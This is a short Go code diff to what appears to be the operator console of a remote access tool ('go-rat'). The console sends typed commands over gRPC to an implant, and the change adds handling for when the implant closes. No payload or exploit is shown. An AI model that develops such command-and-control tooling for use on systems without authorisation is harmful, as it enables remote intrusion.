@@ -4,13 +4,14 @@ import (
 	"bufio"
 	"context"
 	"fmt"
+	"os"
+	"strings"
+
 	"github.com/charmbracelet/lipgloss"
 	"github.com/charmbracelet/log"
 	"github.com/iortego42/go-rat/grpcapi"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
-	"os"
-	"strings"
 )
 
 var prompt = lipgloss.NewStyle().
@@ -25,7 +26,9 @@ func mainLoop(client grpcapi.AdminClient) {
 	)
 	ctx = context.Background()
 	cmd = new(grpcapi.Command)
-	cmd.Id = os.Args[1]
+
+	id := os.Args[1]
+	cmd.Id = id
 	s := bufio.NewScanner(os.Stdin)
 	for {
 		cmd.Out = ""
@@ -34,9 +37,13 @@ func mainLoop(client grpcapi.AdminClient) {
 		cmd.In = strings.Trim(s.Text(), " \n")
 		if cmd.In == "exit" {
 			fmt.Println(prompt.SetString("[+]").Render(), "Bye")
-			os.Exit(0)
+			return
 		}
 		cmd, err = client.RunCommand(ctx, cmd)
+		if cmd == nil && err == nil {
+			log.Info("Implant cerrado", "id", id)
+			return
+		}
 		if err != nil {
 			log.Fatal(err)
 		}
